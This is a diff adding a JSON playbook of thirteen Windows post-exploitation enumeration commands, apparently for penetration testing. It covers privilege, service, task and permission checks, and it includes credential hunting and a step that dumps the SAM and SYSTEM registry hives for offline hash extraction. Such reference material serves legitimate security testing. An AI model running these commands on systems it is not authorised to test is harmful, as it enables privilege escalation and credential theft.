@@ -1,0 +1,85 @@
+{
+  "name": "Windows Enumeration Basics",
+  "description": "Manual post-exploitation enumeration on Windows systems to identify privilege escalation paths, credentials, network info, and persistence opportunities.",
+  "tools": [],
+  "steps": [
+    {
+      "index": 1,
+      "name": "System Information",
+      "command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"; hostname; wmic computersystem get domain",
+      "description": "Gather OS version, build, architecture, hostname, and domain membership for patch level and exploit research."
+    },
+    {
+      "index": 2,
+      "name": "Current User & Privileges",
+      "command": "whoami; whoami /groups | findstr \"High Mandatory\"; whoami /priv",
+      "description": "Identify current user, group memberships (especially High/mandatory level), and token privileges like SeDebugPrivilege."
+    },
+    {
+      "index": 3,
+      "name": "User Accounts & Password Policy",
+      "command": "net user; net localgroup administrators; net accounts",
+      "description": "List local users, admin group members, and password policy (lockout, min length) for brute force or reuse planning."
+    },
+    {
+      "index": 4,
+      "name": "Running Processes",
+      "command": "tasklist /v | findstr /v \"Window Title\"; Get-Process | Select-Object Id,Name,Path,Company | Format-Table -AutoSize",
+      "description": "Enumerate processes with full paths and owners; look for high-integrity processes running as SYSTEM or with weak service accounts."
+    },
+    {
+      "index": 5,
+      "name": "Services & Permissions",
+      "command": "sc query type= service state= all | findstr SERVICE_NAME; Get-Service | Where-Object {$_.Status -eq 'Running'}",
+      "description": "List all services; use accesschk.exe or PowerUp.ps1 later to check modifiable service binaries or unquoted paths."
+    },
+    {
+      "index": 6,
+      "name": "Scheduled Tasks",
+      "command": "schtasks /query /fo LIST /v | findstr \"TaskName\\|Command\\|Run As\"; Get-ScheduledTask | Select-Object TaskName,TaskPath,Actions,Author",
+      "description": "Find tasks running as SYSTEM or higher-privileged users with modifiable .exe/.ps1 paths."
+    },
+    {
+      "index": 7,
+      "name": "Network Configuration",
+      "command": "ipconfig /all; netstat -ano | findstr LISTEN; Get-NetIPAddress; Get-NetRoute",
+      "description": "Show interfaces, DNS, listening ports with PIDs, and routing table for internal pivoting."
+    },
+    {
+      "index": 8,
+      "name": "Firewall & AV",
+      "command": "netsh advfirewall show allprofiles; Get-MpComputerStatus 2>$null || echo \"Defender status N/A\"",
+      "description": "Check firewall rules and Windows Defender status to assess detection risk."
+    },
+    {
+      "index": 9,
+      "name": "Credential Hunting",
+      "command": "cmdkey /list; dir \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Protect\"; dir \"%USERPROFILE%\\AppData\\Local\\Microsoft\\Credentials\\\"",
+      "description": "List saved RDP credentials, DPAPI master keys, and credential blobs (use Mimikatz later if privesc achieved)."
+    },
+    {
+      "index": 10,
+      "name": "Patch Level & Hotfixes",
+      "command": "wmic qfe list brief | findstr /i \"KB\"; Get-HotFix | Select-Object HotFixID,InstalledOn | Sort-Object InstalledOn -Descending",
+      "description": "List installed patches to identify missing KBs (search exploit-db or MSF for local exploits)."
+    },
+    {
+      "index": 11,
+      "name": "Writable Directories & Files",
+      "command": "icacls \"C:\\Program Files\" 2>$null | findstr \"Everyone:(F)\"; icacls \"C:\\ProgramData\" 2>$null | findstr \"BUILTIN\\\\Users:(F)\"",
+      "description": "Check common paths for weak permissions allowing DLL hijacking or binary replacement."
+    },
+    {
+      "index": 12,
+      "name": "Registry Autoruns",
+      "command": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run; reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "description": "Inspect persistence via Run keys; look for paths writable by current user."
+    },
+    {
+      "index": 13,
+      "name": "SAM & LSA Secrets (if admin)",
+      "command": "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save 2>$null; reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save 2>$null",
+      "description": "Dump SAM and SYSTEM hives if SeBackupPrivilege or admin; extract hashes offline with secretsdump.py."
+    }
+  ]
+}
